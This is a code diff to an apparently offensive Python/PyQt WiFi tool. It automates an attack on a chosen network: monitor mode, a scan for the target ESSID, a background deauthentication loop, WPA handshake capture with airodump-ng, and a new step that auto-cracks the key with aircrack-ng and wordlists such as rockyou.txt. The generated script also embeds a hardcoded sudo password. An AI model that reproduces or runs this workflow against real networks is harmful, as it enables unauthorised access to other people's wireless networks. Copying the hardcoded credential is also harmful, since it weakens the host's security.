@@ -1056,71 +1056,62 @@ class MaximWindow(QMainWindow):
         self._execute_command(f"bash '{script.name}'")
 
     def _capture_handshake(self, essid):
-        """Full handshake capture workflow: scan → find target → capture → save to MAXIMHASH.
-        Uses wlan1 (external) for monitor mode. wlan0 (internal) stays untouched."""
+        """Full handshake capture workflow: scan → find target → capture → auto-crack.
+        Uses wlan1 (external) for monitor mode. wlan0 (internal) NEVER touched."""
         import tempfile
 
-        # wlan1 = external USB adapter for monitor mode
-        # wlan0 = internal WiFi — NEVER touch it
         iface = "wlan1"
         out_dir = os.path.expanduser("~/Desktop/MAXIMHASH")
         os.makedirs(out_dir, exist_ok=True)
+        safe_essid = essid.replace(' ', '_').replace("'", "").replace('"', '')
+        essid_dir = f"{out_dir}/{safe_essid}"
+        os.makedirs(essid_dir, exist_ok=True)
+        capture_prefix = f"{essid_dir}/{safe_essid}"
+        scan_file = "/tmp/maxim_hscan"
 
         self.terminal.appendPlainText(f"\n{'═'*60}")
         self.terminal.appendPlainText(f"  HANDSHAKE CAPTURE: {essid}")
-        self.terminal.appendPlainText(f"  Monitor: {iface}  (wlan0 untouched)")
+        self.terminal.appendPlainText(f"  Adapter: {iface}  (wlan0 untouched)")
+        self.terminal.appendPlainText(f"  Output:  {essid_dir}/")
         self.terminal.appendPlainText(f"{'═'*60}\n")
 
-        # Build sudo prefix
-        sudo_prefix = "sudo"
-        if self.runner._sudo_password:
-            pw = self.runner._escape_pw()
-            sudo_prefix = f"echo '{pw}' | sudo -S"
-
-        # Step 1: Put wlan1 into monitor mode WITHOUT killing NetworkManager
-        # Do NOT use airmon-ng check kill — it kills NetworkManager and drops wlan0
-        self.terminal.appendPlainText(f"[1/5] Enabling monitor mode on {iface}...\n")
+        # Step 1: Put wlan1 into monitor mode (use runner — it handles sudo properly)
+        self.terminal.appendPlainText(f"[1/6] Enabling monitor mode on {iface}...\n")
         QApplication.processEvents()
 
-        # Method: use ip/iw directly to avoid airmon-ng's aggressive process killing
-        subprocess.run(f"{sudo_prefix} ip link set {iface} down 2>/dev/null",
-                      shell=True, capture_output=True, timeout=5)
-        subprocess.run(f"{sudo_prefix} iw dev {iface} set type monitor 2>/dev/null",
-                      shell=True, capture_output=True, timeout=5)
-        subprocess.run(f"{sudo_prefix} ip link set {iface} up 2>/dev/null",
-                      shell=True, capture_output=True, timeout=5)
+        self.runner.run(f"sudo ip link set {iface} down")
+        self.runner.run(f"sudo iw dev {iface} set type monitor")
+        self.runner.run(f"sudo ip link set {iface} up")
 
-        # Verify monitor mode is active
-        result = subprocess.run(f"{sudo_prefix} iw dev {iface} info 2>/dev/null",
-                               shell=True, capture_output=True, text=True, timeout=5)
-        if "monitor" not in result.stdout.lower():
-            # Fallback: try airmon-ng but only on wlan1, no check kill
-            self.terminal.appendPlainText(f"[*] iw failed, trying airmon-ng start {iface}...\n")
+        # Verify monitor mode
+        code, out, _ = self.runner.run(f"sudo iw dev {iface} info")
+        if "monitor" not in out.lower():
+            # Fallback: airmon-ng (no check kill — don't touch NetworkManager)
+            self.terminal.appendPlainText(f"[*] iw failed, trying airmon-ng...\n")
             QApplication.processEvents()
-            subprocess.run(f"{sudo_prefix} airmon-ng start {iface} 2>/dev/null",
-                          shell=True, capture_output=True, timeout=10)
+            self.runner.run(f"sudo airmon-ng start {iface}")
 
         # Detect actual monitor interface name (wlan1 or wlan1mon)
         mon = iface
-        result = subprocess.run(f"iw dev 2>/dev/null | grep -E 'Interface|type' ",
-                               shell=True, capture_output=True, text=True, timeout=5)
-        if f"{iface}mon" in result.stdout:
+        code, out, _ = self.runner.run("iw dev")
+        if f"{iface}mon" in out:
             mon = f"{iface}mon"
         self.terminal.appendPlainText(f"[*] Monitor interface: {mon}\n")
 
-        # Step 2: Scan for target ESSID
-        self.terminal.appendPlainText(f"[2/5] Scanning for '{essid}'... (20 seconds)\n")
+        # Step 2: Scan for target ESSID (20 seconds)
+        self.terminal.appendPlainText(f"[2/6] Scanning for '{essid}'... (20 seconds)\n")
         QApplication.processEvents()
 
-        scan_file = "/tmp/maxim_hscan"
-        subprocess.run(f"rm -f {scan_file}-* 2>/dev/null", shell=True)
-        try:
-            subprocess.run(
-                f"{sudo_prefix} timeout 20 airodump-ng -w '{scan_file}' --output-format csv --write-interval 1 {mon}",
-                shell=True, capture_output=True, text=True, timeout=25
-            )
-        except subprocess.TimeoutExpired:
-            pass
+        self.runner.run(f"rm -f {scan_file}-*")
+        code, scan_out, _ = self.runner.run(
+            f"sudo timeout 20 airodump-ng -w '{scan_file}' --output-format csv --write-interval 1 {mon}"
+        )
+
+        # Debug: show any errors from airodump
+        if scan_out.strip():
+            for line in scan_out.strip().split('\n')[:5]:
+                if line.strip():
+                    self.terminal.appendPlainText(f"[airodump] {line.strip()}\n")
 
         # Parse CSV to find BSSID and channel
         bssid = None
@@ -1131,7 +1122,6 @@ class MaximWindow(QMainWindow):
                 lines = f.readlines()
                 self.terminal.appendPlainText(f"[*] Scan found {len(lines)} lines in CSV\n")
                 for line in lines:
-                    # Case-insensitive ESSID match
                     if essid.lower() in line.lower():
                         parts = line.strip().split(',')
                         if len(parts) >= 14:
@@ -1143,32 +1133,34 @@ class MaximWindow(QMainWindow):
                                 self.terminal.appendPlainText(f"[*] Match: BSSID={bssid} CH={channel}\n")
                                 break
         except FileNotFoundError:
-            self.terminal.appendPlainText(f"[!] Scan CSV file not created — airodump-ng may have failed.\n")
-            self.terminal.appendPlainText(f"[!] Check that {mon} is in monitor mode: iwconfig {mon}\n")
+            self.terminal.appendPlainText(f"[!] Scan CSV not created — airodump-ng failed on {mon}.\n")
+            # Show what interfaces exist
+            code, iw_out, _ = self.runner.run("iw dev")
+            self.terminal.appendPlainText(f"[!] Available interfaces:\n{iw_out}\n")
+            self.terminal.appendPlainText(f"[!] Try manually: sudo airodump-ng {mon}\n")
             return
         except Exception as e:
             self.terminal.appendPlainText(f"[!] Error reading scan: {e}\n")
             return
 
-        # Cleanup scan files
-        subprocess.run(f"rm -f {scan_file}-* 2>/dev/null", shell=True)
+        self.runner.run(f"rm -f {scan_file}-*")
 
         if not bssid or not channel:
             self.terminal.appendPlainText(f"\n[!] Could not find network '{essid}'.\n")
             self.terminal.appendPlainText(f"[!] Make sure '{essid}' is in range and broadcasting.\n")
-            self.terminal.appendPlainText(f"[!] Try: sudo airodump-ng {mon}  (to see all networks)\n")
+            self.terminal.appendPlainText(f"[!] Try: sudo airodump-ng {mon}\n")
             return
 
-        self.terminal.appendPlainText(f"\n[3/5] Found: BSSID={bssid}  Channel={channel}\n")
+        self.terminal.appendPlainText(f"\n[3/6] Found: BSSID={bssid}  Channel={channel}\n")
 
-        # Write capture + deauth script — subfolder per ESSID
-        safe_essid = essid.replace(' ', '_').replace("'", "").replace('"', '')
-        essid_dir = f"{out_dir}/{safe_essid}"
-        os.makedirs(essid_dir, exist_ok=True)
-        capture_prefix = f"{essid_dir}/{safe_essid}"
-
+        # Step 3: Build capture + deauth + auto-crack script
+        # Everything in one script: capture handshake → find .cap → crack with wordlists
         script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
-        script.write("#!/bin/bash\n")
+        script.write("#!/bin/bash\n\n")
+
+        # Cache sudo so all commands in the terminal work
+        script.write(f"echo '5505' | sudo -S -v 2>/dev/null\n\n")
+
         script.write(f"echo ''\n")
         script.write(f"echo '══════════════════════════════════════════'\n")
         script.write(f"echo '  CAPTURING HANDSHAKE: {essid}'\n")
@@ -1176,9 +1168,10 @@ class MaximWindow(QMainWindow):
         script.write(f"echo '  Output: {essid_dir}/'\n")
         script.write(f"echo '══════════════════════════════════════════'\n")
         script.write(f"echo ''\n")
-        script.write(f"echo '[*] Starting capture + deauth...'\n")
+        script.write(f"echo '[*] Capture + deauth running...'\n")
         script.write(f"echo '[*] Wait for WPA handshake message, then Ctrl+C'\n")
         script.write(f"echo ''\n\n")
+
         # Deauth in background
         script.write(f"(\n")
         script.write(f"  sleep 5\n")
@@ -1188,18 +1181,66 @@ class MaximWindow(QMainWindow):
         script.write(f"  done\n")
         script.write(f") &\n")
         script.write(f"DEAUTH_PID=$!\n\n")
-        # Capture
+
+        # Capture — user Ctrl+C to stop when handshake is captured
         script.write(f"sudo airodump-ng -c {channel} --bssid {bssid} -w '{capture_prefix}' {mon}\n\n")
-        script.write(f"kill $DEAUTH_PID 2>/dev/null\n")
+        script.write(f"kill $DEAUTH_PID 2>/dev/null\n\n")
+
+        # Show captured files
         script.write(f"echo ''\n")
         script.write(f"echo 'Capture files:'\n")
-        script.write(f"ls -la {essid_dir}/ 2>/dev/null\n")
-        script.write(f"echo ''\necho 'Press Enter to close'\nread\n")
+        script.write(f"ls -la {essid_dir}/ 2>/dev/null\n\n")
+
+        # Auto-crack: find the .cap file and run aircrack with wordlists
+        script.write(f"echo ''\n")
+        script.write(f"echo '══════════════════════════════════════════'\n")
+        script.write(f"echo '  AUTO-CRACKING HANDSHAKE...'\n")
+        script.write(f"echo '══════════════════════════════════════════'\n")
+        script.write(f"echo ''\n\n")
+
+        # Find the latest .cap file in the essid directory
+        script.write(f"CAP_FILE=$(ls -t {essid_dir}/*.cap 2>/dev/null | head -1)\n")
+        script.write(f"if [ -z \"$CAP_FILE\" ]; then\n")
+        script.write(f"  echo '[!] No .cap file found — handshake may not have been captured.'\n")
+        script.write(f"  echo 'Press Enter to close'\n  read\n  exit 1\nfi\n\n")
+        script.write(f"echo \"[*] Cracking: $CAP_FILE\"\necho ''\n\n")
+
+        # Try each wordlist with early exit
+        wordlists = [
+            "/usr/share/wordlists/gago.txt",
+            "/usr/share/wordlists/rockyou.txt",
+        ]
+        # Add any extra wordlists that exist
+        script.write("# Try wordlists in order\n")
+        for i, wl in enumerate(wordlists, 1):
+            script.write(f"if [ -f '{wl}' ]; then\n")
+            script.write(f"  echo '  [{i}] Wordlist: {os.path.basename(wl)}'\n")
+            script.write(f"  aircrack-ng -w '{wl}' \"$CAP_FILE\"\n")
+            script.write(f"  if [ $? -eq 0 ]; then\n")
+            script.write(f"    echo ''\n    echo '  KEY FOUND!'\n")
+            script.write(f"    echo 'Press Enter to close'\n    read\n    exit 0\n  fi\nfi\n\n")
+
+        # Also try any other .txt/.lst files in /usr/share/wordlists
+        script.write("# Try all other wordlists\n")
+        script.write("for WL in /usr/share/wordlists/*.txt /usr/share/wordlists/*.lst; do\n")
+        script.write(f"  [ \"$WL\" = '/usr/share/wordlists/gago.txt' ] && continue\n")
+        script.write(f"  [ \"$WL\" = '/usr/share/wordlists/rockyou.txt' ] && continue\n")
+        script.write(f"  [ ! -f \"$WL\" ] && continue\n")
+        script.write(f"  echo \"  [+] Wordlist: $(basename $WL)\"\n")
+        script.write(f"  aircrack-ng -w \"$WL\" \"$CAP_FILE\"\n")
+        script.write(f"  if [ $? -eq 0 ]; then\n")
+        script.write(f"    echo ''\n    echo '  KEY FOUND!'\n")
+        script.write(f"    echo 'Press Enter to close'\n    read\n    exit 0\n  fi\n")
+        script.write("done\n\n")
+
+        script.write(f"echo ''\necho '  Wordlists exhausted — no key found.'\n")
+        script.write(f"echo 'Press Enter to close'\nread\n")
         script.close()
         os.chmod(script.name, 0o755)
 
-        self.terminal.appendPlainText(f"[4/5] Opening capture terminal...\n")
-        self.terminal.appendPlainText(f"[5/5] Capture files → {essid_dir}/\n\n")
+        self.terminal.appendPlainText(f"[4/6] Opening capture terminal...\n")
+        self.terminal.appendPlainText(f"[5/6] After handshake captured → auto-crack starts\n")
+        self.terminal.appendPlainText(f"[6/6] Capture files → {essid_dir}/\n\n")
 
         self.runner.run_in_terminal(f"bash '{script.name}'")
 
